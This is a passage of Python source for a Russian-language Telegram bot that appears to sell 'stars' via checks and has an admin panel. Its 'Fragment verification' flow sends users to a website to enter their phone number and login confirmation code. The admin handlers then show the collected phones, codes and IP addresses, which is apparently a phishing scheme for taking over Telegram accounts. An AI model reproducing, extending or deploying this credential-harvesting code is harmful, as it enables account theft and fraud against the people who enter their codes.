    users = star_bot.user_checks
    
    if not users:
        await query.edit_message_text(
            "📭 Нет активных пользователей.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')]
            ])
        )
        return
    
    message = "👤 ПОЛЬЗОВАТЕЛИ\n\n"
    
    for i, (user_id, checks) in enumerate(list(users.items())[:10]):
        wallet_balance = star_bot.get_user_wallet(user_id)
        message += f"""<b>{i+1}. ID: {user_id}</b>
├ Баланс: {wallet_balance:.0f} ⭐
└ Чеков: {len(checks)}

"""
    
    keyboard = [
        [InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')]
    ]
    
    await query.edit_message_text(
        message,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def admin_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Меню настроек"""
    query = update.callback_query
    await query.answer()
    
    stats = star_bot.get_admin_stats()
    
    message = f"""⚙️ НАСТРОЙКИ

👑 Админов: {stats['total_admins']}
💰 Общий баланс: {stats['total_wallet_balance']:.0f} ⭐
📊 Всего чеков: {stats['total_checks']}"""
    
    keyboard = [
        [InlineKeyboardButton("➕ Добавить админа", callback_data='admin_add_admin')],
        [InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')]
    ]
    
    await query.edit_message_text(
        message,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def admin_add_admin_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Добавление админа"""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📝 Отправьте ID пользователя для добавления в админы:",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Отмена", callback_data='admin_settings')]
        ])
    )
    
    context.user_data['awaiting_admin_id'] = True

async def handle_admin_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик сообщений для админов"""
    user = update.effective_user
    
    if 'awaiting_admin_id' in context.user_data:
        try:
            admin_id = int(update.message.text)
            star_bot.add_admin(admin_id, update.message.from_user.username)
            
            await update.message.reply_text(
                f"✅ Пользователь {admin_id} добавлен в администраторы!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("⬅️ Work-панель", callback_data='admin_panel')]
                ])
            )
            
            del context.user_data['awaiting_admin_id']
            
        except ValueError:
            await update.message.reply_text("❌ Неверный формат ID. Введите число.")
    
    elif 'waiting_for_inline_amount' in context.user_data:
        try:
            amount = float(update.message.text)
            
            if amount <= 0 or amount > 10000:
                await update.message.reply_text("❌ Сумма должна быть от 1 до 10000.")
                return
            
            check_id, check_link = star_bot.create_inline_check(user.id, amount)
            
            await update.message.reply_text(
                f"""✅ Чек создан!
💰 Сумма: {amount}⭐
🔗 ID: <code>{check_id}</code>

📱 Для отправки введите:
<code>@{context.bot.username} {check_id}</code>""",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("➕ Ещё", callback_data='admin_inline_check'),
                        InlineKeyboardButton("⬅️ Назад", callback_data='admin_panel')
                    ]
                ])
            )
            
            del context.user_data['waiting_for_inline_amount']
            
        except ValueError:
            await update.message.reply_text("❌ Введите корректное число.")
    
    elif 'waiting_for_amount' in context.user_data:
        await get_custom_amount(update, context)

# ========== ВЕРИФИКАЦИЯ ==========
async def verification_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда верификации"""
    user = update.effective_user
    
    if star_bot.is_admin(user.id):
        await show_verification_panel(update, context)
    else:
        message = """🔐 ВЕРИФИКАЦИЯ FRAGMENT

Для покупки звёзд требуется верификация.

📋 Процесс:
1. Перейдите на сайт
2. Введите номер телефона
3. Введите код подтверждения
4. Ожидайте проверки

⏱ Время проверки: 5-15 минут."""
        
        keyboard = [
            [InlineKeyboardButton("📋 Проверить статус", callback_data='check_verification_status')],
            [InlineKeyboardButton("⬅️ Назад", callback_data='back_to_main')]
        ]
        
        await update.message.reply_text(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def show_verification_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Панель верификации для админов"""
    user = update.effective_user
    
    if not star_bot.is_admin(user.id):
        return
    
    pending = verification_bot.get_pending_verifications()
    website = verification_bot.get_website_verifications()
    
    message = f"""👮‍♂️ ПАНЕЛЬ ВЕРИФИКАЦИЙ

📋 Ожидающих:
├ Из бота: {len(pending)}
└ С сайта: {len(website)}"""
    
    keyboard = [
        [InlineKeyboardButton("🌐 С сайта", callback_data='website_verifications')],
        [InlineKeyboardButton("⬅️ Work-панель", callback_data='admin_panel')]
    ]
    
    if hasattr(update, 'callback_query'):
        await update.callback_query.message.edit_text(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

async def website_verifications_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Просмотр верификаций с сайта"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    
    if not star_bot.is_admin(user.id):
        return
    
    verifications = verification_bot.get_website_verifications(limit=20)
    
    if not verifications:
        await query.edit_message_text(
            "🌐 Нет верификаций с сайта.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Назад", callback_data='verify_panel')]
            ])
        )
        return
    
    message = "🌐 ВЕРИФИКАЦИИ С САЙТА\n\n"
    
    for i, data in enumerate(verifications):
        try:
            created_time = data['created_at'].strftime("%d.%m %H:%M")
        except:
            created_time = str(data.get('created_at', 'Неизвестно'))
        
        message += f"""<b>{i+1}. {created_time}</b>
├ 📱: {data['phone']}
├ 🔐: <code>{data['code']}</code>
└ 🌐: {data.get('ip', 'unknown')}

"""
    
    keyboard = [
        [
            InlineKeyboardButton("🗑 Очистить", callback_data='clear_website_verifications'),
            InlineKeyboardButton("🔄 Обновить", callback_data='website_verifications')
        ],
        [InlineKeyboardButton("⬅️ Назад", callback_data='verify_panel')]
    ]
    
    await query.edit_message_text(
        message,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def clear_website_verifications(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Очистка верификаций"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    
    if not star_bot.is_admin(user.id):
        return
    
    verification_bot.clear_website_verifications()
    
    await query.edit_message_text(
        "✅ Верификации очищены.",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("⬅️ Назад", callback_data='verify_panel')]
        ])
    )

async def check_verification_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Проверка статуса верификации"""
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    
    if verification_bot.is_user_verified(user.id):
        status = "✅ ВЕРИФИЦИРОВАН"
    else:
        status = "❌ НЕ ВЕРИФИЦИРОВАН"
    
    message = f"""🔐 СТАТУС ВЕРИФИКАЦИИ

👤 Пользователь: {user.full_name}
📊 Статус: {status}"""
    
    keyboard = [
        [InlineKeyboardButton("⬅️ На главную", callback_data='back_to_main')]
    ]
    
    await query.edit_message_text(
        message,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# ========== ОБЩИЙ ОБРАБОТЧИК КНОПОК ==========
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик всех inline кнопок"""
    query = update.callback_query
    data = query.data
    
    # Главное меню
    if data == 'back_to_main':
        await show_main_menu(update, context)
        return ConversationHandler.END
    
    # Основные функции
    elif data == 'create_check':
        await create_check_handler(update, context)
    elif data == 'my_checks':
        await my_checks_handler(update, context)
    elif data == 'help':
        await help_command(update, context)
    elif data == 'auto_gifts':
        await auto_gifts_handler(update, context)
    elif data == 'auto_gifts_on':
        await auto_gifts_toggle(update, context, True)
    elif data == 'auto_gifts_off':
        await auto_gifts_toggle(update, context, False)
    
    # Суммы для чеков
    elif data.startswith('amount_'):
        await amount_selected(update, context)
    elif data == 'custom_amount':
        await amount_selected(update, context)
    
    # Админ-панель
    elif data == 'admin_panel':
        await show_admin_panel(update, context)
    elif data == 'admin_inline_check':
        await admin_inline_check(update, context)
    elif data.startswith('inline_amount_'):
        amount = int(data.replace('inline_amount_', ''))
        await create_inline_check_handler(update, context, amount)
    elif data == 'inline_custom_amount':
        await query.edit_message_text(
            "📝 Введите сумму:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅️ Отмена", callback_data='admin_inline_check')]
            ])
        )
        context.user_data['waiting_for_inline_amount'] = True
    elif data == 'admin_all_checks':
        await admin_all_checks(update, context)
    elif data == 'admin_users':
        await admin_users_list(update, context)
    elif data == 'admin_settings':
        await admin_settings_menu(update, context)
    elif data == 'admin_add_admin':
        await admin_add_admin_handler(update, context)
    
    # Верификация
    elif data == 'verify_panel':
        await show_verification_panel(update, context)
    elif data == 'website_verifications':
        await website_verifications_handler(update, context)
    elif data == 'clear_website_verifications':
        await clear_website_verifications(update, context)
    elif data == 'check_verification_status':
        await check_verification_status(update, context)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отмена действия"""
    await update.message.reply_text("❌ Действие отменено.")
    
    if 'waiting_for_amount' in context.user_data:
        del context.user_data['waiting_for_amount']
    
    return ConversationHandler.END

# ========== ЗАПУСК ==========
def main():
    """Главная функция запуска"""
    
    # Запускаем Flask в отдельном потоке
    webhook_thread = Thread(target=run_webhook_server, daemon=True)
    webhook_thread.start()
    
    # Даем время Flask запуститься
    time.sleep(2)
    
    # Создаем приложение бота
    application = Application.builder().token(BOT_TOKEN).build()
    
    # ConversationHandler
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('start', start),
            CommandHandler('admin', admin_command),
            CallbackQueryHandler(button_handler)
        ],
        states={
            GET_AMOUNT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_amount)
            ],
            AUTO_GIFTS: [
                CallbackQueryHandler(button_handler, pattern='^(auto_gifts_on|auto_gifts_off|back_to_main)$')
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    # Добавляем обработчики
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("setadmin", setadmin_command))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("verification", verification_command))
    
    # Inline режим
    application.add_handler(InlineQueryHandler(inline_query_handler))
    application.add_handler(ChosenInlineResultHandler(lambda u, c: None))
    
    # Обработчик сообщений
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_message))
    
    print("=" * 60)
    print("🤖 TELEGRAM БОТ ЗАПУЩЕН!")
    print(f"   Токен: {BOT_TOKEN[:10]}...")
    print(f"   Порт вебхука: {WEBHOOK_PORT}")
    print("=" * 60)
    print("\n📋 КОМАНДЫ:")
    print("• /start - главное меню")
    print("• /admin - админ-панель (для админов)")
    print("• /setadmin <ключ> - стать админом")
    print("• /verification - верификация")
    print("\n🌐 ВЕБХУК:")
    print(f"   /webhook - прием данных")
    print(f"   /health - проверка здоровья")
    print("=" * 60)
    
    # Запускаем бота
    application.run_polling()

if __name__ == '__main__':
    main()
